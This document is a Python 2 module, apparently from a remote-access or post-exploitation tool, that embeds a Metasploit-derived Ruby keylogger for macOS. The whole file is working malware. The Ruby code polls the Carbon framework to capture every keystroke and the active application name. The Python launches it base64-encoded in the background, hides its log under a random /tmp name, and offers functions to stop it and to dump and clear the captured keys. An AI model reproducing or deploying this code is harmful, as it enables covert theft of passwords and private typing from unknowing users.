import os
import time
import base64
import subprocess
import string
import random

pid = int()
logFile = ''

# ruby code from metasploit
# https://github.com/rapid7/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb
def get_ruby_code():
	return '''
	require 'thread'
	require 'dl'
	require 'dl/import'
	Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end
	def ruby_1_9_or_higher?
	  RUBY_VERSION.to_f >= 1.9
	end
	def malloc(size)
	  if ruby_1_9_or_higher?
	    DL::CPtr.malloc(size)
	  else
	    DL::malloc(size)
	  end
	end
	if not ruby_1_9_or_higher?
	  module DL
	    module Importable
	      def method_missing(meth, *args, &block)
	        str = meth.to_s
	        lower = str[0,1].downcase + str[1..-1]
	        if self.respond_to? lower
	          self.send lower, *args
	        else
	          super
	        end
	      end
	    end
	  end
	end
	SM_KCHR_CACHE = 38
	SM_CURRENT_SCRIPT = -2
	MAX_APP_NAME = 80
	module Carbon
	  extend Importer
	  dlload '/System/Library/Frameworks/Carbon.framework/Carbon'
	  extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'
	  extern 'void GetFrontProcess(ProcessSerialNumber *)'
	  extern 'void GetKeys(void *)'
	  extern 'unsigned char *GetScriptVariable(int, int)'
	  extern 'unsigned char KeyTranslate(void *, int, void *)'
	  extern 'unsigned char CFStringGetCString(void *, void *, int, int)'
	  extern 'int CFStringGetLength(void *)'
	end
	psn = malloc(16)
	name = malloc(16)
	name_cstr = malloc(MAX_APP_NAME)
	keymap = malloc(16)
	state = malloc(8)
	itv_start = Time.now.to_i
	prev_down = Hash.new(false)
	lastWindow = ""
	while (true) do
	  Carbon.GetFrontProcess(psn.ref)
	  Carbon.CopyProcessName(psn.ref, name.ref)
	  Carbon.GetKeys(keymap)
	  str_len = Carbon.CFStringGetLength(name)
	  copied = Carbon.CFStringGetCString(name, name_cstr, MAX_APP_NAME, 0x08000100) > 0
	  app_name = if copied then name_cstr.to_s else 'Unknown' end
	  bytes = keymap.to_str
	  cap_flag = false
	  ascii = 0
	  ctrlchar = ""
	  (0...128).each do |k|
	    if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
	      if not prev_down[k]
	        case k
	          when 36
	            ctrlchar = "[enter]"
	          when 48
	            ctrlchar = "[tab]"
	          when 49
	            ctrlchar = " "
	          when 51
	            ctrlchar = "[delete]"
	          when 53
	            ctrlchar = "[esc]"
	          when 55
	            ctrlchar = "[cmd]"
	          when 56
	            ctrlchar = "[shift]"
	          when 57
	            ctrlchar = "[caps]"
	          when 58
	            ctrlchar = "[option]"
	          when 59
	            ctrlchar = "[ctrl]"
	          when 63
	            ctrlchar = "[fn]"
	          else
	            ctrlchar = ""
	        end
	        if ctrlchar == "" and ascii == 0
	          kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
	          curr_ascii = Carbon.KeyTranslate(kchr, k, state)
	          curr_ascii = curr_ascii >> 16 if curr_ascii < 1
	          prev_down[k] = true
	          if curr_ascii == 0
	            cap_flag = true
	          else
	            ascii = curr_ascii
	          end
	        elsif ctrlchar != ""
	          prev_down[k] = true
	        end
	      end
	    else
	      prev_down[k] = false
	    end
	  end
	  if ascii != 0 or ctrlchar != ""
	    if app_name != lastWindow
	      puts "\n\n[#{app_name}] - [#{Time.now}]\n"
	      lastWindow = app_name
	    end
	    if ctrlchar != ""
	      print "#{ctrlchar}"
	    elsif ascii > 32 and ascii < 127
	      c = if cap_flag then ascii.chr.upcase else ascii.chr end
	      print "#{c}"
	    else
	      print "[#{ascii}]"
	    end
	    $stdout.flush
	  end
	  Kernel.sleep(0.01)
	end'''

def keylogger_start():
	global pid
	global logFile

	if logFile:
		if os.path.exists(logFile):
			return 'running'

	base64_ruby_code = base64.b64encode(get_ruby_code())
	
	randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
	logFile = '/tmp/{name}'.format(name=randname)
	cmd = 'echo "require \'base64\';eval(Base64.decode64(\'%s\'))" | ruby > %s &' % (base64_ruby_code, logFile)
	os.popen(cmd)
	time.sleep(1)
	
	# get process id
	try:
		pid = os.popen('ps aux | grep " ruby" | grep -v grep').read().split()[1]
	except:
		pass

	print logFile
	print pid
	return True

def keylogger_stop():
	global logFile

	# remove log file
	if os.path.exists(logFile):
		# kill keylogger process
		cmd = 'kill %s' % str(pid)
		subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

		os.remove(logFile)
		logFile = ''
		return True
	else:
		return False

def keylogger_dump():
	if not os.path.exists(logFile):
		return None

	buffer = open(logFile, 'r').read()

	# clean file
	file = open(logFile, 'w').write('')
	
	return buffer